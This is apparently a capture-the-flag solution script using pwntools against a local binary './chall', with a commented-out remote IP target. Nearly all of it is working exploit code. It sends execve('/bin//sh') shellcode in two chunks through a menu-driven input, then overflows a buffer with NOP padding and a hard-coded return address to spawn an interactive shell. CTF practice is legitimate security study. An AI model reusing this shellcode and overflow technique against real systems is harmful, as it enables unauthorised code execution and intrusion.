#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = process("./chall")
# r = remote("124.16.75.117", 51001)
r.send(b"0\n")
r.send(b"1\n")
r.send(b"1\n")

# "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
r.send(b"1\n")
r.send(b"5\n")
r.send(b"50000\n")
r.sendline("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89")
r.send("\n")
r.send(b"1\n")
r.send(b"5\n")
r.send(b"50000\n")
r.sendline("\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")

r.send(b"1\n")
r.send(b"5\n")
r.send(b"50000\n")
r.sendline(b"\x90" * 0x4C + p64(0x101928))

r.interactive()

# ebp-156
# input[152]
#
